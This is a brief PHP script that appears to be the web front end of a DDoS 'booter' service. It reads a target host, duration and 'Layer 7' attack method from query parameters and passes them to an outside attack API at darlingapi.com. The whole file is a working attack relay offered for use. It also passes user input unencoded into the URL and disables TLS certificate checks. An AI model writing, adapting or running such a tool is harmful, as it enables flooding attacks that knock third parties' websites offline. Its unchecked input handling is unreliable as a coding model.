<?php

//Fields
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
$mode = $_GET['mode'];

//Layer 7 Methods
if ($method == "HTTP-SPAM") $method = "SOCKETv2";
if ($method == "HTTP-BYPASS") $method = "SOCKETv3";

//API Link
$Link = "https://darlingapi.com/?key=YOURAPIKEY&host=$host&port=80&time=$time&method=$method&mode=$mode";

try 
{  
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $Link);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	$result = curl_exec($ch);
	curl_close($ch);
}

catch(Exception $e)
{
 	die("Something went wrong. Please contact an administrator!");
}

echo $result;

?>
